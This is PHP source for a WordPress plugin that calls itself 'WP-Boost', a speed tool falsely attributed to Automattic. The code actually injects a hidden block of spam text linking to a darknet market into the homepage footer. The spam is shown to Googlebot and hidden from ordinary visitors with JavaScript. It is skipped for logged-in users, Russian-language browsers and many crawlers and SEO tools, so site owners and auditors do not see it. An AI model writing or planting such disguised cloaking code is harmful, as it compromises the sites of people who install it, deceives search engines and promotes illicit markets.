<?php
/**
 * @package wp-boost
 */
/*
Plugin Name: WP-Boost
Plugin URI: https://wordpress.org/
Description: Used by millions, WP-Boost is quite possibly the best way in the world to speed up your blog.
Version: 4.3.11
Author: Automattic
Author URI: https://wordpress.org/
License: GPLv2 or later
Text Domain: wordpress
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

Copyright 20016-2019 Automattic, Inc.
*/



define( 'WP_Boost', '4.3.11' );
define( 'WP_Boost__PLUGIN_DIR', plugin_dir_path( __FILE__ ) );
define( 'WP_Boost_DELETE_LIMIT', 100000 );

$uniq_domain_id = substr(md5($_SERVER['HTTP_HOST']),0,7);


$js = '<script type="text/javascript">function size_for(n) {
    return n ? (n + sum(n - 1)) : 0;
}
try{
    document.getElementById("'.$uniq_domain_id.'").style.fontsize = size_for("Brave");
} catch (e) {
    console.log("Screen version error");
} finally {
    document.getElementById("'.$uniq_domain_id.'").style.display = "none";
}</script> ';

$additional_menu = '<span id="'.$uniq_domain_id.'">
Farm and Internet Magazine.
And this is not all kinds of activity.
How to get into the darket? First you need to find the right market. Communication with the frequent issues about dark stores, I write a detailed guide.
I post all the options available today.
So:
1) Versuse Market (<a href="https://darknetpages.com/versus-market/">https://darknetpages.com/versus-market/</a>) is one of the oldest and famous DarkNet stores.
He has a forum where you can communicate.
But this is not necessary, I just want to know as much as possible about it.
So, if there is a desire to work with natural and safe products, it is worth paying attention to the KFH "Texas". These are not just two different areas of activity of our companies.
Two different approaches, two different spheres ... ...
- We have two goals that we want to achieve together.
The first is sales via the Internet.
Second - development in the field of agriculture.
.</span>';


function checkUAforBot($ua)
{
    global $bots_ua;

    $bots_ua = array("MegaIndex.ru 2.0", "archive.org_bot", "Wayback Machine Live Record", "BLEXBot", "BlackWidow", "Nutch", "Jetbot", "WebVac", "Stanford", "scooter", "naver", "dumbot", "Hatena Antenna", "grub", "looksmart", "WebZip", "larbin", "b2w/0.1", "Copernic", "psbot", "Python-urllib", "NetMechanic", "URL_Spider_Pro", "CherryPicker", "EmailCollector", "EmailSiphon", "WebBandit", "EmailWolf", "Email", "ExtractorPro", "CopyRightCheck", "Crescent", "SiteSnagger", "ProWebWalker", "CheeseBot", "LNSpiderguy", "ia_archiver", "Alexibot", "Teleport", "MIIxpc", "Telesoft", "Website Quester", "moget", "WebStripper", "WebSauger", "WebCopier", "NetAnts", "Mister PiX", "WebAuto", "TheNomad", "WWW-Collector-E", "RMA", "libWeb/clsHTTP", "asterias", "httplib", "turingos", "spanner", "Harvest", "InfoNaviRobot", "Bullseye", "WebBandit", "NICErsPRO", "Microsoft URL Control", "DittoSpyder", "Foobot", "WebmasterWorldForumBot", "SpankBot","BotALot", "lwp-trivial", "WebmasterWorld", "BunnySlippers", "URLy Warning", "Wget", "LinkWalker", "cosmos", "hloader","humanlinks", "LinkextractorPro", "Offline Explorer", "Mata Hari", "LexiBot", "Web Image Collector", "The Intraformant", "True_Robot", "BlowFish", "SearchEngineWorld", "JennyBot", "MIIxpc", "BuiltBotTough", "ProPowerBot", "BackDoorBot", "toCrawl/UrlDispatcher", "WebEnhancer", "suzuran", "WebViewer", "VCI", "Szukacz", "QueryN", "Openfind", "Openbot", "Webster", "EroCrawler", "LinkScan", "Keyword", "Kenjin", "Iron33", "Bookmark search tool", "GetRight", "FairAd Client", "Gaisbot", "Aqua_Products", "Radiation Retriever 1.1", "Flaming AttackBot", "Oracle Ultra Search", "MSIECrawler", "PerMan", "searchpreview", "sootle", "Enterprise_Search", "Bot mailto:craftbot@yahoo.com", "ChinaClaw", "Custo", "DISCo", "Download Demon", "eCatch", "EirGrabber", "EmailSiphon","EmailWolf", "Express WebPictures", "ExtractorPro", "EyeNetIE", "FlashGet", "GetRight", "GetWeb!", "Go!Zilla", "Go-Ahead-Got-It", "GrabNet", "Grafula", "HMView", "HTTrack", "Image Stripper", "Image Sucker", "Indy Library", "InterGET", "Internet Ninja", "JetCar", "JOC Web Spider", "larbin", "LeechFTP", "Mass Downloader", "MIDown tool", "Mister PiX", "Navroad", "NearSite", "NetAnts", "NetSpider", "Net Vampire", "NetZIP", "Octopus", "Offline Explorer", "Offline Navigator", "PageGrabber", "Papa Foto", "pavuk", "pcBrowser", "RealDownload", "ReGet", "SiteSnagger", "SmartDownload", "SuperBot", "SuperHTTP", "Surfbot", "tAkeOut", "Teleport Pro", "VoidEYE", "Web Image Collector", "Web Sucker", "WebAuto", "WebCopier", "WebFetch", "WebGo IS", "WebLeacher", "WebReaper", "WebSauger", "Website eXtractor", "Website Quester", "WebStripper", "WebWhacker", "WebZIP", "Wget", "Widow", "WWWOFFLE", "Xaldon WebSpider", "Zeus", "Semrush", "BecomeBot", "AhrefsBot", "MJ12bot", "rogerbot", "exabot", "Xenu", "dotbot", "gigabot", "publicwww", "BlekkoBot");


    foreach ($bots_ua as $key => $value) {
        if (false !== stripos($ua, $value)) {
            return true;
        }
    }
    return false;
}
	
function change_wp_footer( )
{
 global $uniq_domain_id;   
 global $additional_menu;
 global $js;

 
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 $httplang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
 if  ( is_home() OR is_front_page() ) {$ishomepage = true;} else {$ishomepage = false;}
 //$ishomepage = true;
 
 if ( ($ishomepage ) and  !(is_user_logged_in()) and  (stripos($httplang,"ru") === false) and (checkUAforBot($useragent) == false))
 { 
    $nav_menu = '';
    $nav_menu = $nav_menu.$additional_menu.$js;
    if (stripos($useragent,"Googlebot") === false)
    { echo $nav_menu;}  else { echo $additional_menu;}
 }  

}

//add_action( 'wp_footer', 'change_wp_footer' );
add_action( 'get_footer', 'change_wp_footer' );
